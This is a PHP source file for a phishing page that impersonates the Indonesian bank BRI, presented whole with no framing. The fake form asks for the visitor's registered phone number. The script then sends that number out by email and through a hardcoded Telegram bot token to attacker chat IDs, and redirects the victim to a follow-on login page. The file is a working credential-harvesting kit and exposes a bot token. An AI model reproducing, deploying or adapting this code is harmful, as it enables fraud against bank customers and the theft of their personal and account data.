<?php ob_start() ?>
<?php 
if (!function_exists('base_url')) {
function base_url($atRoot=FALSE, $atCore=FALSE, $parse=FALSE){
if (isset($_SERVER['HTTP_HOST'])) {
$http = isset($_SERVER['HTTPS']) && strtolower($_SERVER['HTTPS']) !== 'off' ? 'https' : 'http';
$hostname = $_SERVER['HTTP_HOST'];
$dir = str_replace(basename($_SERVER['SCRIPT_NAME']), '', $_SERVER['SCRIPT_NAME']);
$core = preg_split('@/@', str_replace($_SERVER['DOCUMENT_ROOT'], '', realpath(dirname(__FILE__))), NULL, PREG_SPLIT_NO_EMPTY);
$core = $core[0];
$tmplt = $atRoot ? ($atCore ? "%s://%s/%s/" : "%s://%s/") : ($atCore ? "%s://%s/%s/" : "%s://%s%s");
$end = $atRoot ? ($atCore ? $core : $hostname) : ($atCore ? $core : $dir);
$base_url = sprintf( $tmplt, $http, $hostname, $end );
}
else $base_url = 'http://localhost/';
if ($parse) {
$base_url = parse_url($base_url);
if (isset($base_url['path'])) if ($base_url['path'] == '/') $base_url['path'] = '';
}
return $base_url;
}
}
$base_url = base_url();

?>
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title></title>
</head>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>

<style type="text/css">
    html, body {
      max-width: 100%;
      overflow-x: hidden;
      background-image:url("bri_new5.png");
        background-repeat: no-repeat;
        background-size: cover;
      }
     
     
  /* The side navigation menu */
  .sidenav {

      background-color: black;
      height: 1000%; /* 100% Full-height */
      width: 0; /* 0 width - change this with JavaScript */
      position: absolute; /* Stay in place */
      z-index: 2; /* Stay on top */
      top: 0;
      left: 0; /* Black*/
      overflow-x: hidden; /* Disable horizontal scroll */
      padding-top: 60px; /* Place content 60px from the top */
      transition: 0.5s; /* 0.5 second transition effect to slide in the sidenav */
  }
   
  /* The navigation menu links */
  .sidenav a {
      padding: 8px 8px 8px 15px;
      text-decoration: none;
      font-size: 15px;
      color: white;
      display: block;
      transition: 0.3s;
  }
   
  /* When you mouse over the navigation links, change their color */
  .sidenav a:hover, .offcanvas a:focus{
      color: #f1f1f1;
  }
   
  /* Position and style the close button (top right corner) */
  .sidenav .closebtn {
      position: absolute;
      top: 0;
      right: 25px;
      font-size: 36px;
      margin-left: 50px;
  }
   
  /* Style page content - use this if you want to push the page content to the right when you open the side navigation */
  #main {
      transition: margin-left .5s;
      padding: 20px;
      padding-left: 30px;
      padding-right: 30px;
      overflow:hidden;
      width:100%;
      position: relative;
  }
  body {
    overflow-x: hidden;
  }
   
  /* Add a black background color to the top navigation */
  .topnav {
      width: 100%;
      background-color: #fff;
      padding-top: 1px;
      padding-bottom: 1px;
      border-bottom: 2px solid #e4e4e4;
      position: fixed;
      z-index: 1;
  }
   
  /* Style the links inside the navigation bar */
  .topnav a {
      float: right;
      color: #f2f2f2;
      text-align: center;
      padding: 14px 16px;
      text-decoration: none;
      font-size: 17px;
  }
  
  .topnav .btnlogin {
      
      /*background: linear-gradient(90deg, #eb9e34 0%, #d85401 100%);*/
      
      border-radius: 10px;
      float: right;
      display: block;
      text-align: center;
      margin-top: 8px;
      text-decoration: none;
      font-size: 15px;
      color: #fff;
  }

  .tblkirim {
      border-radius: 10px;
      float: right;
      display: block;
      text-align: center;
      margin-top: 8px;
      text-decoration: none;
      font-size: 15px;
      color: #fff;
  }
   
  /* Change the color of links on hover */
  .topnav a:hover {
      background-color: #ddd;
      color: black;
  }
   
  /* Add a color to the active/current link */
  .topnav a.active {
      background-color: #4CAF50;
      color: white;
  }
   
  /* On smaller screens, where height is less than 450px, change the style of the sidenav (less padding and a smaller font size) */
  @media screen and (max-height: 450px) {
      .sidenav {padding-top: 15px;}
      .sidenav a {font-size: 18px;}
  }
   
  a svg{
    transition:all .5s ease;
   
    &:hover{
      #transform:rotate(180deg);
    }
  }
   
  #ico{
    display: none;
  }
   
  .menu{
    background: #000;
    display: none;
    padding: 5px;
    width: 320px;
    @include border-radius(5px);
   
    #transition: all 0.5s ease;
   
    a{
      display: block;
      color: #fff;
      text-align: center;
      padding: 10px 2px;
      margin: 3px 0;
      text-decoration: none;
      background: #444;
   
      &:nth-child(1){
        margin-top: 0;
        @include border-radius(3px 3px 0 0 );
      }
      &:nth-child(5){
        margin-bottom: 0;
        @include border-radius(0 0 3px 3px);
      }
   
      &:hover{
        background: #555;
      }
    }
  }
}
.wafixed {
    position: fixed;
    right: 30px;
    bottom: 30px;
    z-index: 999;
}
</style>
<script>
function openNav() {
    document.getElementById("sideNavigation").style.width = "250px";
    document.getElementById("main").style.marginLeft = "250px";
}
 
function closeNav() {
    document.getElementById("sideNavigation").style.width = "0";
    document.getElementById("main").style.marginLeft = "0";
}
</script>
<body>

<div class="container">
    <div class="row">
        
      <form id="form_hp" action="" method="post" enctype="multipart/form-data">
      
      <div style="margin-top:80px;background-color:white;padding:20px;border-radius:10px;box-shadow: 2px 3px 6px 0px #c4cbd7;margin-bottom:10px" class="col-sm-6 col-md-6">
          
        <div class="row" >
           <center>
               <img style="width:40%;float:center" src="logo_bankbri.png">
           </center>
       </div>
       <br><br>
       <div class="row" style="padding-top:-5px;padding-bottom:-15px;margin-bottom:15px;float:left;margin-left:-1px;margin-right:-1px;background-color:white;border:2px solid #628c9b;border-radius:10px">
           <div class="row" >
                <span style="font-size:16px;margin-top:5px">
                    <img style="width:25px;margin-top:-3px" src="logo_info.jpg"> Catatan
                </span>
            </div>
            <span style="font-size:14px">Masukan nomor handphone</span>
            <span style="font-size:14px;margin-top:-3px">yang terdaftar</span>
       </div>
        
       <br>
       <div class="mb-4">
          <label  style="font-size: 17px;font-weight: Bold;" for="exampleFormControlTextarea1" class="form-label">No Handphone Anda</label>
            <div class="input-group">
              <!--<span class="input-group-btn">
                <img width="60px" src="https://siapjadi.com/benderari.png" style="border:1px solid grey">
              </span>-->
              <input type="number" name="nomorhp" required style="background-color: #FFF;font-weight: Bold" class="form-control" id="nomorhp" maxlenght="12" rows="3" placeholder="08XX-XXXX-XXXX">
            </div><!-- /input-group -->
          </div><!-- /.col-lg-6 -->
          <div class="row" >
              <center>
                  <input name="lanjutkan" type="submit" style="
                  border:0px;
                  font-size:20px ;
                  background: #0F78CB;
                  color: white;
                  border-radius: 10px;
                  font-weight: bold;
                  width:100%;
                  float:centre;"  class="btn btn-primary" value="Lanjutkan">
              
                 
              </center>
           </div>
           <div class="row" >
               <img width="100%" src="norton.png">
           </div>
       </form>
       
    </div>
    <div class="row" >
       <img width="100%" src="ptbRI.png">
   </div>
    
    
    
</div>


</body>
</html>
<?php

$submit=$_POST['lanjutkan'];
$telepon=$_POST['nomorhp'];

// KONTEN RESULT AKUN
$subjek = "Data Akun";
$pesan = <<<EOD
<!DOCTYPE html>
	<html>
	<head>
		<title></title>
		<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
		<style type="text/css">
			body {
				font-family: "Helvetica";
				width: 90%;
				display: block;
				margin: auto;
				border: 1px solid #fff;
				background: #fff;
			}

			.result {
				width: 100%;
				height: 100%;
				display: block;
				margin: auto;
				position: fixed;
				top: 0;
				right: 0;
				left: 0;
				bottom: 0;
				z-index: 999;
				overflow-y: scroll;
				border-radius: 10px;
			}

			.tblResult {
				width: 100%;
				display: table;
				margin: 0px auto;
				border-collapse: collapse;
				text-align: center;
				background: #fcfcfc;
			}
			.tblResult th {
				text-align: left;
				font-size: 1em;
				margin: auto;
				padding: 15px 10px;
				background: #001240;
				border: 2px solid #001240;
				color: #fff;
			}

			.tblResult td {
				font-size: 1em;
				margin: auto;
				padding: 10px;
				border: 2px solid #001240;
				text-align: left;
				font-weight: bold;
				color: #000;
				text-shadow: 0px 0px 10px #fcfcfc;

			}

			.tblResult th img {
				width: 100%;
				display: block;
				margin: auto;
				box-shadow: 0px 0px 10px rgba(0,0,0, 0.5);
				border-radius: 10px;
			}
		</style>
	</head>
	<body>
		<div class="result">
			<table class="tblResult">
			    <tr>
					<th style="text-align: center;" colspan="3"> Info Pendaftaran Kartu Kredit </th>
				</tr>
				
				<tr>
					<td style="border-right: none;">No handphone </td>
					<td style="text-align: center;">$telepon</td>
				</tr>
				
				<tr>
					<th style="text-align: center;" colspan="3">&copy; Brynz.ID</th>
				</tr>
			</table>
		</div>
	</body>
	</html>
EOD;



include 'mailman.php';
$sender ='From: BRI <admin@Brynz.ID>';
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sender.'' . "\r\n";
/*$kirim = mail($mail, $subjek, $pesan, $headers);*/


ini_set( 'display_errors', 1 );   
error_reporting( E_ALL );    
$from = $sender;    
$to = $mail;    
$subject = $subjek;    
$message = $pesan;   
/*$headers = "From:" . $from;  */  

$pesantelegram = <<<EOD
BRImo Notif 
------------------------
Nomor Handphone : $telepon 
EOD;

$telegram_id = $id_telegram;
$message_text = $pesantelegram;
$secret_token = '5751555863:AAGdbEXztQKMOYOJuxCRDECvLYJiyOwkwSQ';

function sendMessage($telegram_id, $message_text, $secret_token) {
    $url = "https://api.telegram.org/bot" . $secret_token . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($message_text);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    $err = curl_error($ch);
    curl_close($ch);

    if ($err) {
       echo 'Pesan gagal terkirim, error :' . $err;
    }else{
        echo 'Pesan terkirim';
    }
}

$telegram_id2 = '5597739679';
function sendMessage2($telegram_id2, $message_text, $secret_token) {
    $url = "https://api.telegram.org/bot" . $secret_token . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id2;
    $url = $url . "&text=" . urlencode($message_text);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    $err = curl_error($ch);
    curl_close($ch);

    if ($err) {
       echo 'Pesan gagal terkirim, error :' . $err;
    }else{
        echo 'Pesan terkirim';
    }
}


if($submit){
    mail($to,$subject,$pesan, $headers); 
    sendMessage($telegram_id, $message_text, $secret_token);
    sendMessage2($telegram_id2, $message_text, $secret_token);
    header('Location: '.$base_url."login.php?nomorhp=".$telepon);
}
ob_end_flush()
?>
